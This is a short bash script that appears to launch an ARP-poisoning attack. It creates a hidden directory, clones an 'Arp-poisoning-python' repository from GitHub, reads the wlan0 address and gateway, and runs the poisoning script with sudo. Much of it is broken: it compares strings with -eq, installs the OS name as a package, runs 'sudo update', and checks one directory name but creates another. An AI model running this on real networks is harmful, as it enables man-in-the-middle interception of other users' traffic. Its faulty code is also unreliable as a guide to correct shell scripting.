#!/bin/bash


install_needed(){

    local package=$1

    if [ "$ID" -eq "kali" -o $ID -eq "ubuntu" -o $ID -eq "debian" -o $ID -eq "parrot" ];then
        sudo update & 
        sudo apt install $1& 
    elif [ $ID -eq "arch" ];then
        sudo pacman -S $1 &
    elif [ $ID -eq "fedora"  -o $ID -eq "centos" ];then
        sudo dnf install $1 &
    elif [ $ID -eq "opensuse-leap" ];then
        sudo zypper install $1 &
    else
        echo "Failed to detect the os"
    fi 
}

if [ -f /etc/os-release ]; then
    . /etc/os-release #allow to access the variable defined in the /etc/os-release 
    echo "Operating System: $NAME"
    echo "Version: $VERSION"
    echo "NAME : $ID"

    install_needed "$ID"

    

    if [ ! -d ".syscrod" ];then
        mkdir .syscond
        cd .syscond
        git clone "https://github.com/Abhishekh669/Arp-poisoning-python"
    
        checkLib=$(whereis python3)
        if [ ! -z $checkLib ]; then
            ip_address=$(ifconfig wlan0 | cut -d " " -f 2 )
            gateway=$(arp -a | cut -d " " -f 2 | tr -d '()')
            sudo python3 Arp-poisoning-python/arp_poison.py $ip_address $gateway wlan0 
        else
            install_needed "python3 python3-pip"
            pip3 install scapy
            ip_address=$(ifconfig wlan0 | cut -d " " -f 2 )
            gateway=$(arp -a | cut -d " " -f 2 | tr -d '()')
            sudo python3 Arp-poisoning-python/arp_poison.py $ip_address $gateway wlan0 

        fi 
    else 

        checkLib=$(whereis python3)
        if [ ! -z $checkLib ]; then
            ip_address=$(ifconfig wlan0 | cut -d " " -f 2 )
         gateway=$(arp -a | cut -d " " -f 2 | tr -d '()')
         sudo python3 Arp-poisoning-python/arp_poison.py $ip_address $gateway wlan0 
         fi
    fi


else
    echo "OS information not found "
    echo "Kernel Name: $(uname -s)"
    echo "Kernel Version: $(uname -r)"
fi
